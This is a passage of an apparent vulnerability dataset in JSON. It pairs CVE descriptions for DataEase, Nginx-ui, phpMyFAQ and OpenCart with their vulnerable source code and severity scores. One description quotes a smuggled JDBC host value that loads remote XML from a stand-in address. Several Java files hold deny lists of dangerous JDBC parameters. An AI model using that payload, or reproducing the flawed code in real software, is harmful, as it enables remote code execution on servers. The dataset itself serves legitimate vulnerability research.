\"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\"\n                    .replace(\"HOSTNAME\", getHost().trim())\n                    .replace(\"PORT\", getPort().toString().trim())\n                    .replace(\"DATABASE\", getDataBase().trim())\n                    .replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n        }\n    }\n}\n"
        }
      ],
      "method_level": [
        "public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\"\n                    .replace(\"HOSTNAME\", getHost().trim())\n                    .replace(\"PORT\", getPort().toString().trim())\n                    .replace(\"DATABASE\", getDataBase().trim());\n        } else {\n            for (String illegalParameter : illegalParameters) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase())) {\n                    DEException.throwException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\"\n                    .replace(\"HOSTNAME\", getHost().trim())\n                    .replace(\"PORT\", getPort().toString().trim())\n                    .replace(\"DATABASE\", getDataBase().trim())\n                    .replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 28,
          "content": "                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase())) {"
        }
      ]
    },
    "cwe": [
      "CWE-502"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.1,
    "cvss_version": 3.1
  },
  {
    "id": 73,
    "cve": "CVE-2024-22197",
    "description": "Nginx-ui is online statistics for Server Indicators​​ Monitor CPU usage, memory usage, load average, and disk usage in real-time. The `Home > Preference` page exposes a small list of nginx settings such as `Nginx Access Log Path` and `Nginx Error Log Path`. However, the API also exposes `test_config_cmd`, `reload_cmd` and `restart_cmd`. While the UI doesn't allow users to modify any of these settings, it is possible to do so by sending a request to the API. This issue may lead to authenticated Remote Code Execution, Privilege Escalation, and Information Disclosure. This issue has been patched in version 2.0.0.beta.9.",
    "vulnerability": {
      "file_level": [
        {
          "name": "api/system/settings.go",
          "content": "package system\n\nimport (\n    \"github.com/0xJacky/Nginx-UI/api\"\n    \"github.com/0xJacky/Nginx-UI/settings\"\n    \"github.com/gin-gonic/gin\"\n    \"net/http\"\n)\n\nfunc GetSettings(c *gin.Context) {\n    c.JSON(http.StatusOK, gin.H{\n        \"server\": settings.ServerSettings,\n        \"nginx\":  settings.NginxSettings,\n        \"openai\": settings.OpenAISettings,\n    })\n}\n\nfunc SaveSettings(c *gin.Context) {\n    var json struct {\n        Server settings.Server `json:\"server\"`\n        Nginx  settings.Nginx  `json:\"nginx\"`\n        Openai settings.OpenAI `json:\"openai\"`\n    }\n\n    if !api.BindAndValid(c, &json) {\n        return\n    }\n\n    settings.ServerSettings = json.Server\n    settings.NginxSettings = json.Nginx\n    settings.OpenAISettings = json.Openai\n\n    settings.ReflectFrom()\n\n    err := settings.Save()\n    if err != nil {\n        api.ErrHandler(c, err)\n        return\n    }\n\n    GetSettings(c)\n}\n"
        }
      ],
      "method_level": [
        "func GetSettings(c *gin.Context) {\n    c.JSON(http.StatusOK, gin.H{\n        \"server\": settings.ServerSettings,\n        \"nginx\":  settings.NginxSettings,\n        \"openai\": settings.OpenAISettings,\n    })\n}",
        "func SaveSettings(c *gin.Context) {\n    var json struct {\n        Server settings.Server `json:\"server\"`\n        Nginx  settings.Nginx  `json:\"nginx\"`\n        Openai settings.OpenAI `json:\"openai\"`\n    }\n\n    if !api.BindAndValid(c, &json) {\n        return\n    }\n\n    settings.ServerSettings = json.Server\n    settings.NginxSettings = json.Nginx\n    settings.OpenAISettings = json.Openai\n\n    settings.ReflectFrom()\n\n    err := settings.Save()\n    if err != nil {\n        api.ErrHandler(c, err)\n        return\n    }\n\n    GetSettings(c)\n}"
      ],
      "hunk_level": [
        {
          "line_no": 11,
          "content": "    c.JSON(http.StatusOK, gin.H{"
        },
        {
          "line_no": 12,
          "content": "        \"server\": settings.ServerSettings,"
        },
        {
          "line_no": 13,
          "content": "        \"nginx\":  settings.NginxSettings,"
        },
        {
          "line_no": 14,
          "content": "        \"openai\": settings.OpenAISettings,"
        },
        {
          "line_no": 15,
          "content": "    })"
        },
        {
          "line_no": 19,
          "content": "    var json struct {"
        },
        {
          "line_no": 20,
          "content": "        Server settings.Server `json:\"server\"`"
        },
        {
          "line_no": 21,
          "content": "        Nginx  settings.Nginx  `json:\"nginx\"`"
        },
        {
          "line_no": 22,
          "content": "        Openai settings.OpenAI `json:\"openai\"`"
        },
        {
          "line_no": 23,
          "content": "    }"
        },
        {
          "line_no": 25,
          "content": "    if !api.BindAndValid(c, &json) {"
        },
        {
          "line_no": 26,
          "content": "        return"
        },
        {
          "line_no": 27,
          "content": "    }"
        },
        {
          "line_no": 29,
          "content": "    settings.ServerSettings = json.Server"
        },
        {
          "line_no": 30,
          "content": "    settings.NginxSettings = json.Nginx"
        },
        {
          "line_no": 31,
          "content": "    settings.OpenAISettings = json.Openai"
        },
        {
          "line_no": 33,
          "content": "    settings.ReflectFrom()"
        },
        {
          "line_no": 35,
          "content": "    err := settings.Save()"
        },
        {
          "line_no": 36,
          "content": "    if err != nil {"
        },
        {
          "line_no": 37,
          "content": "        api.ErrHandler(c, err)"
        },
        {
          "line_no": 38,
          "content": "        return"
        },
        {
          "line_no": 39,
          "content": "    }"
        },
        {
          "line_no": 41,
          "content": "    GetSettings(c)"
        }
      ]
    },
    "cwe": [
      "CWE-77"
    ],
    "severity": "HIGH",
    "cvss_score": 7.7,
    "cvss_version": 3.1
  },
  {
    "id": 74,
    "cve": "CVE-2024-22197",
    "description": "Nginx-ui is online statistics for Server Indicators​​ Monitor CPU usage, memory usage, load average, and disk usage in real-time. The `Home > Preference` page exposes a small list of nginx settings such as `Nginx Access Log Path` and `Nginx Error Log Path`. However, the API also exposes `test_config_cmd`, `reload_cmd` and `restart_cmd`. While the UI doesn't allow users to modify any of these settings, it is possible to do so by sending a request to the API. This issue may lead to authenticated Remote Code Execution, Privilege Escalation, and Information Disclosure. This issue has been patched in version 2.0.0.beta.9.",
    "vulnerability": {
      "file_level": [
        {
          "name": "api/system/settings.go",
          "content": "package system\n\nimport (\n    \"github.com/0xJacky/Nginx-UI/api\"\n    \"github.com/0xJacky/Nginx-UI/settings\"\n    \"github.com/gin-gonic/gin\"\n    \"net/http\"\n)\n\nfunc GetSettings(c *gin.Context) {\n    c.JSON(http.StatusOK, gin.H{\n        \"server\": settings.ServerSettings,\n        \"nginx\":  settings.NginxSettings,\n        \"openai\": settings.OpenAISettings,\n    })\n}\n\nfunc SaveSettings(c *gin.Context) {\n    var json struct {\n        Server settings.Server `json:\"server\"`\n        Nginx  settings.Nginx  `json:\"nginx\"`\n        Openai settings.OpenAI `json:\"openai\"`\n    }\n\n    if !api.BindAndValid(c, &json) {\n        return\n    }\n\n    settings.ServerSettings = json.Server\n    settings.NginxSettings = json.Nginx\n    settings.OpenAISettings = json.Openai\n\n    settings.ReflectFrom()\n\n    err := settings.Save()\n    if err != nil {\n        api.ErrHandler(c, err)\n        return\n    }\n\n    GetSettings(c)\n}\n"
        }
      ],
      "method_level": [
        "func GetSettings(c *gin.Context) {\n    c.JSON(http.StatusOK, gin.H{\n        \"server\": settings.ServerSettings,\n        \"nginx\":  settings.NginxSettings,\n        \"openai\": settings.OpenAISettings,\n    })\n}",
        "func SaveSettings(c *gin.Context) {\n    var json struct {\n        Server settings.Server `json:\"server\"`\n        Nginx  settings.Nginx  `json:\"nginx\"`\n        Openai settings.OpenAI `json:\"openai\"`\n    }\n\n    if !api.BindAndValid(c, &json) {\n        return\n    }\n\n    settings.ServerSettings = json.Server\n    settings.NginxSettings = json.Nginx\n    settings.OpenAISettings = json.Openai\n\n    settings.ReflectFrom()\n\n    err := settings.Save()\n    if err != nil {\n        api.ErrHandler(c, err)\n        return\n    }\n\n    GetSettings(c)\n}"
      ],
      "hunk_level": [
        {
          "line_no": 11,
          "content": "    c.JSON(http.StatusOK, gin.H{"
        },
        {
          "line_no": 12,
          "content": "        \"server\": settings.ServerSettings,"
        },
        {
          "line_no": 13,
          "content": "        \"nginx\":  settings.NginxSettings,"
        },
        {
          "line_no": 14,
          "content": "        \"openai\": settings.OpenAISettings,"
        },
        {
          "line_no": 15,
          "content": "    })"
        },
        {
          "line_no": 19,
          "content": "    var json struct {"
        },
        {
          "line_no": 20,
          "content": "        Server settings.Server `json:\"server\"`"
        },
        {
          "line_no": 21,
          "content": "        Nginx  settings.Nginx  `json:\"nginx\"`"
        },
        {
          "line_no": 22,
          "content": "        Openai settings.OpenAI `json:\"openai\"`"
        },
        {
          "line_no": 23,
          "content": "    }"
        },
        {
          "line_no": 25,
          "content": "    if !api.BindAndValid(c, &json) {"
        },
        {
          "line_no": 26,
          "content": "        return"
        },
        {
          "line_no": 27,
          "content": "    }"
        },
        {
          "line_no": 29,
          "content": "    settings.ServerSettings = json.Server"
        },
        {
          "line_no": 30,
          "content": "    settings.NginxSettings = json.Nginx"
        },
        {
          "line_no": 31,
          "content": "    settings.OpenAISettings = json.Openai"
        },
        {
          "line_no": 33,
          "content": "    settings.ReflectFrom()"
        },
        {
          "line_no": 35,
          "content": "    err := settings.Save()"
        },
        {
          "line_no": 36,
          "content": "    if err != nil {"
        },
        {
          "line_no": 37,
          "content": "        api.ErrHandler(c, err)"
        },
        {
          "line_no": 38,
          "content": "        return"
        },
        {
          "line_no": 39,
          "content": "    }"
        },
        {
          "line_no": 41,
          "content": "    GetSettings(c)"
        }
      ]
    },
    "cwe": [
      "CWE-77"
    ],
    "severity": "HIGH",
    "cvss_score": 7.7,
    "cvss_version": 3.1
  },
  {
    "id": 513,
    "cve": "CVE-2024-28105",
    "description": "phpMyFAQ is an open source FAQ web application for PHP 8.1+ and MySQL, PostgreSQL and other databases. The category image upload function in phpmyfaq is vulnerable to manipulation of the `Content-type` and `lang` parameters, allowing attackers to upload malicious files with a .php extension, potentially leading to remote code execution (RCE) on the system. This vulnerability is fixed in 3.2.6.",
    "vulnerability": {
      "file_level": [
        {
          "name": "phpmyfaq/src/phpMyFAQ/Attachment/File.php",
          "content": "<?php\n\n/**\n * Attachment handler class for files stored in filesystem.\n *\n * This Source Code Form is subject to the terms of the Mozilla Public License,\n * v. 2.0. If a copy of the MPL was not distributed with this file, You can\n * obtain one at https://mozilla.org/MPL/2.0/.\n *\n * @package   phpMyFAQ\n * @author    Anatoliy Belsky <ab@php.net>\n * @copyright 2009-2023 phpMyFAQ Team\n * @license   https://www.mozilla.org/MPL/2.0/ Mozilla Public License Version 2.0\n * @link      https://www.phpmyfaq.de\n * @since     2009-08-21\n */\n\nnamespace phpMyFAQ\\Attachment;\n\nuse phpMyFAQ\\Attachment\\Filesystem\\AbstractFile as FilesystemFile;\nuse phpMyFAQ\\Attachment\\Filesystem\\File\\EncryptedFile;\nuse phpMyFAQ\\Attachment\\Filesystem\\File\\FileException;\nuse phpMyFAQ\\Attachment\\Filesystem\\File\\VanillaFile;\n\n/**\n * Class File\n *\n * @package phpMyFAQ\\Attachment\n */\nclass File extends AttachmentAbstract implements AttachmentInterface\n{\n    /**\n     * Build file path under which the attachment, file is accessible in filesystem\n     *\n     * @throws AttachmentException\n     */\n    protected function buildFilePath(): string\n    {\n        $attachmentPath = PMF_ATTACHMENTS_DIR;\n        $fsHash = $this->mkVirtualHash();\n        $subDirCount = 3;\n        $subDirNameLength = 5;\n\n        for ($i = 0; $i < $subDirCount; ++$i) {\n            $attachmentPath .= DIRECTORY_SEPARATOR . substr($fsHash, $i * $subDirNameLength, $subDirNameLength);\n        }\n\n        return $attachmentPath . (DIRECTORY_SEPARATOR . substr($fsHash, $i * $subDirNameLength));\n    }\n\n    /**\n     * Create subdirectories to save file to.\n     *\n     * @param string $filepath filepath to create subdirectories for\n     * @return bool success\n     */\n    public function createSubDirs(string $filepath): bool\n    {\n        clearstatcache();\n        $attDir = dirname($filepath);\n\n        return file_exists($attDir) && is_dir($attDir) || mkdir($attDir, 0777, true);\n    }\n\n    /**\n     * Check whether the file storage is ok.\n     *\n     * @throws AttachmentException\n     */\n    public function isStorageOk(): bool\n    {\n        clearstatcache();\n        $attachmentDir = dirname($this->buildFilePath());\n\n        return false !== PMF_ATTACHMENTS_DIR &&\n               file_exists(PMF_ATTACHMENTS_DIR) &&\n               is_dir(PMF_ATTACHMENTS_DIR) &&\n               file_exists($attachmentDir) &&\n               is_dir($attachmentDir);\n    }\n\n    /**\n     * Save current attachment to the appropriate storage. The\n     * filepath given will be processed and moved to appropriate\n     * location.\n     *\n     * @param string $filePath full path to the attachment file\n     * @param string $filename filename to force\n     * @throws FileException|AttachmentException\n     * @todo rollback if something went wrong\n     */\n    public function save($filePath, $filename = null): bool\n    {\n        $success = false;\n\n        if (file_exists($filePath)) {\n            $this->realHash = md5_file($filePath);\n            $this->filesize = filesize($filePath);\n            $this->filename = null == $filename ? basename($filePath) : $filename;\n\n            $this->saveMeta();\n\n            $targetFile = $this->buildFilePath();\n\n            if (null !== $this->id && $this->createSubDirs($targetFile)) {\n                // Doing this check we're sure not to unnecessary\n                // overwrite existing unencrypted file duplicates.\n                if (!$this->linkedRecords()) {\n                    $source = new VanillaFile($filePath);\n                    $target = $this->getFile(FilesystemFile::MODE_WRITE);\n\n                    $success = $source->moveTo($target);\n                } else {\n                    $success = true;\n                }\n\n                if ($success) {\n                    $this->postUpdateMeta();\n                } else {\n                    // File wasn't saved\n                    $this->delete();\n                    $success = false;\n                }\n            }\n        }\n\n        return $success;\n    }\n\n    /**\n     * Delete attachment.\n     *\n     * @throws FileException\n     */\n    public function delete(): bool\n    {\n        $success = true;\n\n        // Won't delete the file if there are still some records hanging on it\n        if (!$this->linkedRecords()) {\n            $success &= $this->getFile()->delete();\n        }\n\n        $this->deleteMeta();\n\n        return $success;\n    }\n\n    /**\n     * Retrieve file contents into a variable.\n     */\n    public function get(): string\n    {\n    }\n\n    /**\n     * Output current file to stdout.\n     *\n     * @param bool   $headers if headers must be sent\n     * @param string $disposition disposition type (ignored if $headers false)\n     * @throws AttachmentException\n     */\n    public function rawOut($headers = true, $disposition = 'attachment'): void\n    {\n        $file = $this->getFile();\n\n        if ($headers) {\n            $disposition = 'attachment' == $disposition ? 'attachment' : 'inline';\n            header('Content-Type: ' . $this->mimeType);\n            header('Content-Length: ' . $this->filesize);\n            header(\"Content-Disposition: $disposition; filename=\\\"\" . rawurlencode($this->filename) . \"\\\"\");\n            header(\"Content-MD5: {$this->realHash}\");\n        }\n\n        while (!$file->eof()) {\n            echo $file->getChunk();\n        }\n    }\n\n    /**\n     * Factory method to initialise the corresponding file object.\n     *\n     * @param string $mode File mode for file open\n     * @return VanillaFile|EncryptedFile\n     * @throws AttachmentException\n     */\n    private function getFile($mode = FilesystemFile::MODE_READ)\n    {\n        if ($this->encrypted) {\n            $file = new EncryptedFile(\n                $this->buildFilePath(),\n                $mode,\n                $this->key\n            );\n        } else {\n            $file = new VanillaFile($this->buildFilePath(), $mode);\n        }\n\n        return $file;\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function save($filePath, $filename = null): bool\n    {\n        $success = false;\n\n        if (file_exists($filePath)) {\n            $this->realHash = md5_file($filePath);\n            $this->filesize = filesize($filePath);\n            $this->filename = null == $filename ? basename($filePath) : $filename;\n\n            $this->saveMeta();\n\n            $targetFile = $this->buildFilePath();\n\n            if (null !== $this->id && $this->createSubDirs($targetFile)) {\n                // Doing this check we're sure not to unnecessary\n                // overwrite existing unencrypted file duplicates.\n                if (!$this->linkedRecords()) {\n                    $source = new VanillaFile($filePath);\n                    $target = $this->getFile(FilesystemFile::MODE_WRITE);\n\n                    $success = $source->moveTo($target);\n                } else {\n                    $success = true;\n                }\n\n                if ($success) {\n                    $this->postUpdateMeta();\n                } else {\n                    // File wasn't saved\n                    $this->delete();\n                    $success = false;\n                }\n            }\n        }\n\n        return $success;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 106,
          "content": "                // Doing this check we're sure not to unnecessary"
        }
      ]
    },
    "cwe": [
      "CWE-434"
    ],
    "severity": "HIGH",
    "cvss_score": 7.2,
    "cvss_version": 3.1
  },
  {
    "id": 1337,
    "cve": "CVE-2024-55952",
    "description": "DataEase is an open source business analytics tool. Authenticated users can remotely execute code through the backend JDBC connection. When constructing the jdbc connection string, the parameters are not filtered. Constructing the host as ip:5432/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://ip:5432/1.xml&a= can trigger the ClassPathXmlApplicationContext construction method. The vulnerability has been fixed in v1.18.27. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "core/backend/src/main/java/io/dataease/dto/datasource/MysqlConfiguration.java",
          "content": "package io.dataease.dto.datasource;\n\nimport io.dataease.plugins.datasource.entity.JdbcConfiguration;\nimport lombok.Getter;\nimport lombok.Setter;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.net.URLDecoder;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\n\n@Getter\n@Setter\npublic class MysqlConfiguration extends JdbcConfiguration {\n\n    private String driver = \"com.mysql.jdbc.Driver\";\n    private String extraParams = \"characterEncoding=UTF-8&connectTimeout=5000&useSSL=false&allowPublicKeyRetrieval=true&zeroDateTimeBehavior=convertToNull\";\n    private List<String> illegalParameters = Arrays.asList(\"autoDeserialize\", \"queryInterceptors\", \"statementInterceptors\", \"detectCustomCollations\", \"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\");\n\n    public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim());\n        } else {\n            for (String illegalParameter : getIllegalParameters()) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {\n                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim()).replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n        }\n    }\n\n    public List<String> getIllegalParameters(){\n        List<String> newIllegalParameters = new ArrayList<>();\n        newIllegalParameters.addAll(illegalParameters);\n        newIllegalParameters.addAll(Arrays.asList(\"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\"));\n        return newIllegalParameters;\n    }\n\n}"
        },
        {
          "name": "core/backend/src/main/java/io/dataease/dto/datasource/PgConfiguration.java",
          "content": "package io.dataease.dto.datasource;\n\nimport io.dataease.plugins.datasource.entity.JdbcConfiguration;\nimport lombok.Getter;\nimport lombok.Setter;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.net.URLDecoder;\nimport java.util.Arrays;\nimport java.util.List;\n\n@Getter\n@Setter\npublic class PgConfiguration extends JdbcConfiguration {\n\n    private String driver = \"org.postgresql.Driver\";\n    private String extraParams = \"\";\n    private List<String> illegalParameters = Arrays.asList(\"socketFactory\", \"socketFactoryArg\", \"sslfactory\", \"sslfactoryarg\", \"loggerLevel\", \"loggerFile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\");\n\n\n    public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            if (StringUtils.isEmpty(getSchema())) {\n                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE\"\n                        .replace(\"HOSTNAME\", getHost().trim())\n                        .replace(\"PORT\", getPort().toString().trim())\n                        .replace(\"DATABASE\", getDataBase().trim());\n            } else {\n                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?currentSchema=SCHEMA\"\n                        .replace(\"HOSTNAME\", getHost().trim())\n                        .replace(\"PORT\", getPort().toString().trim())\n                        .replace(\"DATABASE\", getDataBase().trim())\n                        .replace(\"SCHEMA\", getSchema().trim());\n            }\n        } else {\n            for (String illegalParameter : illegalParameters) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {\n                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n            return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\"\n                    .replace(\"HOSTNAME\", getHost().trim())\n                    .replace(\"PORT\", getPort().toString().trim())\n                    .replace(\"DATABASE\", getDataBase().trim())\n                    .replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n\n        }\n    }\n}\n"
        },
        {
          "name": "core/backend/src/main/java/io/dataease/dto/datasource/RedshiftConfiguration.java",
          "content": "package io.dataease.dto.datasource;\n\nimport io.dataease.plugins.datasource.entity.JdbcConfiguration;\nimport lombok.Getter;\nimport lombok.Setter;\n\n@Getter\n@Setter\npublic class RedshiftConfiguration extends JdbcConfiguration {\n\n    private String driver = \"com.amazon.redshift.jdbc42.Driver\";\n\n    public String getJdbc() {\n        // 连接参数先写死，后边要把编码、时区等参数放到数据源的设置中\n        return \"jdbc:redshift://HOSTNAME:PORT/DATABASE\"\n                .replace(\"HOSTNAME\", getHost().trim())\n                .replace(\"PORT\", getPort().toString().trim())\n                .replace(\"DATABASE\", getDataBase().trim());\n    }\n}"
        }
      ],
      "method_level": [
        "public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim());\n        } else {\n            for (String illegalParameter : getIllegalParameters()) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {\n                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim()).replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n        }\n    }",
        "public List<String> getIllegalParameters(){\n        List<String> newIllegalParameters = new ArrayList<>();\n        newIllegalParameters.addAll(illegalParameters);\n        newIllegalParameters.addAll(Arrays.asList(\"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\"));\n        return newIllegalParameters;\n    }",
        "public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            if (StringUtils.isEmpty(getSchema())) {\n                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE\"\n                        .replace(\"HOSTNAME\", getHost().trim())\n                        .replace(\"PORT\", getPort().toString().trim())\n                        .replace(\"DATABASE\", getDataBase().trim());\n            } else {\n                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?currentSchema=SCHEMA\"\n                        .replace(\"HOSTNAME\", getHost().trim())\n                        .replace(\"PORT\", getPort().toString().trim())\n                        .replace(\"DATABASE\", getDataBase().trim())\n                        .replace(\"SCHEMA\", getSchema().trim());\n            }\n        } else {\n            for (String illegalParameter : illegalParameters) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {\n                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n            return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\"\n                    .replace(\"HOSTNAME\", getHost().trim())\n                    .replace(\"PORT\", getPort().toString().trim())\n                    .replace(\"DATABASE\", getDataBase().trim())\n                    .replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n\n        }\n    }",
        "public String getJdbc() {\n        // 连接参数先写死，后边要把编码、时区等参数放到数据源的设置中\n        return \"jdbc:redshift://HOSTNAME:PORT/DATABASE\"\n                .replace(\"HOSTNAME\", getHost().trim())\n                .replace(\"PORT\", getPort().toString().trim())\n                .replace(\"DATABASE\", getDataBase().trim());\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 23,
          "content": "            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim());"
        },
        {
          "line_no": 25,
          "content": "            for (String illegalParameter : getIllegalParameters()) {"
        },
        {
          "line_no": 26,
          "content": "                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {"
        },
        {
          "line_no": 27,
          "content": "                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);"
        },
        {
          "line_no": 28,
          "content": "                }"
        },
        {
          "line_no": 31,
          "content": "            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim()).replace(\"EXTRA_PARAMS\", getExtraParams().trim());"
        },
        {
          "line_no": 35,
          "content": "    public List<String> getIllegalParameters(){"
        },
        {
          "line_no": 24,
          "content": "                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE\""
        },
        {
          "line_no": 29,
          "content": "                return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?currentSchema=SCHEMA\""
        },
        {
          "line_no": 36,
          "content": "            for (String illegalParameter : illegalParameters) {"
        },
        {
          "line_no": 37,
          "content": "                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase()) || URLDecoder.decode(getExtraParams()).contains(illegalParameter.toLowerCase())) {"
        },
        {
          "line_no": 38,
          "content": "                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);"
        },
        {
          "line_no": 39,
          "content": "                }"
        },
        {
          "line_no": 40,
          "content": "            }"
        },
        {
          "line_no": 41,
          "content": "            return \"jdbc:postgresql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\""
        },
        {
          "line_no": 14,
          "content": "        // 连接参数先写死，后边要把编码、时区等参数放到数据源的设置中"
        },
        {
          "line_no": 15,
          "content": "        return \"jdbc:redshift://HOSTNAME:PORT/DATABASE\""
        }
      ]
    },
    "cwe": [
      "CWE-20"
    ],
    "severity": "HIGH",
    "cvss_score": 8.6,
    "cvss_version": 4.0
  },
  {
    "id": 880,
    "cve": "CVE-2024-21516",
    "description": "This affects versions of the package opencart/opencart from 4.0.0.0 and before 4.1.0.0. A reflected XSS issue was identified in the directory parameter of admin common/filemanager.list route. An attacker could obtain a user's token by tricking the user to click on a maliciously crafted URL. The user is then prompted to login and redirected again upon authentication with the payload automatically executing. If the attacked user has admin privileges, this vulnerability could be used as the start of a chain of exploits like Zip Slip or arbitrary file write vulnerabilities in the admin functionality.\r\r**Notes:**\r\r1) This is only exploitable if the attacker knows the name or path of the admin directory. The name of the directory is \"admin\" by default but there is a pop-up in the dashboard warning users to rename it.\r\r2) The fix for this vulnerability is incomplete. The redirect is removed so that it is not possible for an attacker to control the redirect post admin login anymore, but it is still possible to exploit this issue in admin if the user is authenticated as an admin already.",
    "vulnerability": {
      "file_level": [
        {
          "name": "upload/admin/controller/common/login.php",
          "content": "<?php\nnamespace Opencart\\Admin\\Controller\\Common;\n/**\n * Class Login\n *\n * @package Opencart\\Admin\\Controller\\Common\n */\nclass Login extends \\Opencart\\System\\Engine\\Controller {\n\t/**\n\t * Index\n\t *\n\t * @return void\n\t */\n\tpublic function index(): void {\n\t\t$this->load->language('common/login');\n\n\t\t$this->document->setTitle($this->language->get('heading_title'));\n\n\t\t// Check to see if user is already logged\n\t\tif ($this->user->isLogged() && isset($this->request->get['user_token']) && isset($this->session->data['user_token']) && ($this->request->get['user_token'] == $this->session->data['user_token'])) {\n\t\t\t$this->response->redirect($this->url->link('common/dashboard', 'user_token=' . $this->session->data['user_token'], true));\n\t\t}\n\n\t\t// Check to see if user is using incorrect token\n\t\tif (isset($this->request->get['user_token']) && (!isset($this->session->data['user_token']) || ($this->request->get['user_token'] != $this->session->data['user_token']))) {\n\t\t\t$data['error_warning'] = $this->language->get('error_token');\n\t\t} elseif (isset($this->session->data['error'])) {\n\t\t\t$data['error_warning'] = $this->session->data['error'];\n\n\t\t\tunset($this->session->data['error']);\n\t\t} else {\n\t\t\t$data['error_warning'] = '';\n\t\t}\n\n\t\tif (isset($this->session->data['success'])) {\n\t\t\t$data['success'] = $this->session->data['success'];\n\n\t\t\tunset($this->session->data['success']);\n\t\t} else {\n\t\t\t$data['success'] = '';\n\t\t}\n\n\t\t// Create a login token to prevent brute force attacks\n\t\t$this->session->data['login_token'] = oc_token(32);\n\n\t\t$data['login'] = $this->url->link('common/login.login', 'login_token=' . $this->session->data['login_token'], true);\n\n\t\tif ($this->config->get('config_mail_engine')) {\n\t\t\t$data['forgotten'] = $this->url->link('common/forgotten');\n\t\t} else {\n\t\t\t$data['forgotten'] = '';\n\t\t}\n\n\t\tif (isset($this->request->get['route']) && $this->request->get['route'] != 'common/login') {\n\t\t\t$args = $this->request->get;\n\n\t\t\t$route = $args['route'];\n\n\t\t\tunset($args['route']);\n\t\t\tunset($args['user_token']);\n\n\t\t\t$url = '';\n\n\t\t\t$url .= http_build_query($args);\n\n\t\t\t$data['redirect'] = $this->url->link($route, $url);\n\t\t} else {\n\t\t\t$data['redirect'] = '';\n\t\t}\n\n\t\t$data['header'] = 